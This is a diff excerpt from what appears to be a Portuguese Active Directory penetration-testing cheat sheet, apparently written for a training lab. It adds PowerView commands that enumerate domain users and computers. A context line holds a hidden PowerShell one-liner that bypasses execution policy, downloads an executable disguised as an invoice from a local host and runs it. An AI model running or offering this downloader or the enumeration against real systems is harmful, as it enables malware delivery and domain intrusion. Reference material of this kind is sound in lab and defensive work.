@@ -2515,6 +2515,26 @@ CRIAR SPN , SOLICITAR TICKET E QUEBRAR A SENHA (KERBEROASTING)
 powershell.exe -NoExit -ExecutionPolicy Bypass -WindowStyle Hidden $ErrorActionPreference= 'silentlycontinue';(New-Object System.Net.WebClient).DownloadFile('http://127.0.0.1/1.exe', 'C:\\test-WDATP-test\\invoice.exe');Start-Process 'C:\\test-WDATP-test\\invoice.exe'
 ```
 ## POWERVIEW OLD
+##### POWERVIEW OLD - LISTAR USUARIOS
+```
+Get-NetUser
+Get-NetUser | select samaccountname
+Get-NetUser -domain moneycorp.local
+Get-NetUser -domain moneycorp.local | select samaccountname
+Get-NetUser | select samaccountname | measure-object
+Get-NetUser | select -expandproperty cn
+Get-NetUser student209
+```
+##### POWERVIEW OLD - LISTAR COMPUTADORES
+```
+Get-NetComputer
+Get-NetComputer -FullData
+Get-NetComputer -FullData | select samaccountname
+Get-NetComputer -domain dollarcorp.moneycorp.local
+Get-NetComputer | measure-object
+Get-NetComputer -fulldata | select -expandproperty cn
+Get-NetComputer -fulldata dcorp-dc.dollarcorp.moneycorp.local
+```
 ##### POWERVIEW OLD - VERIFICAR QUAL GPO É APLICADA EM UMA OU 
 ```
 Get-Netou -OUName StudentMachines | %{Get-NetComputer -ADSPath $_}
